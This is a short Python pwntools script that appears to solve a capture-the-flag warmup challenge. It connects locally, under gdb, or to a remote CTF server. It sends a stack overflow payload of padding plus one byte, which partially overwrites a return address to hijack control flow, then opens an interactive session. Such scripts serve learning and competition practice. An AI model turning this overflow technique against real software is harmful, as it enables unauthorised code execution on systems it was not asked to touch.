#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("warmup1.ctf.maplebacon.org", 1337)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *vuln+36
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# overwrite the last byte of main function address
payload = b"A" * 0x18
payload += p8(0x19)

sleep(0.5)
p.send(payload)

p.interactive()
